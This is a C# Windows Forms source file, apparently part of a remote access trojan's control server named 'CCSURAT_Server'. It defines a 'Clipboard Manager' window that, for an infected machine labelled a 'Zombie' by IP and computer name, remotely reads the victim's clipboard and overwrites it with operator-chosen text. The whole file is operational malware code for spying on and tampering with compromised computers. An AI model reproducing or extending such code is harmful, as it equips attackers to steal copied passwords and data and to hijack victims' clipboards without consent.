using CCSURAT_Server;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace CCSURAT_Server.ControlForms
{
    public partial class Clipboard : Form
    {
        Zombie zombie;

        public Clipboard(Zombie zombie)
        {
            InitializeComponent();
            this.zombie = zombie;
            this.Text = zombie.IP + " " + zombie.computerName + " Clipboard Manager";
        }

        private void Clipboard_Load(object sender, EventArgs e)
        {
            GetClipboard();
        }

        private void setClipboardToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SetClipboard();
        }

        private void getClipboardToolStripMenuItem_Click(object sender, EventArgs e)
        {
            GetClipboard();
        }

        private void GetClipboard()
        {
            zombie.clipboard = string.Empty;
            zombie.SendData("[[CLIPBOARD]][[/CLIPBOARD]]");
            while (zombie.clipboard == string.Empty)
            {
                System.Threading.Thread.Sleep(2);
                Application.DoEvents();
            }
            string data = zombie.clipboard;
            if (data != "[[EMPTY]]")
                clipboardTextbox.Text = zombie.clipboard;
            else
                clipboardTextbox.Text = string.Empty;
        }

        private void SetClipboard()
        {
            zombie.SendData("[[CLIPBOARD]]" + clipboardTextbox.Text + "[[/CLIPBOARD]]");
        }
    }
}
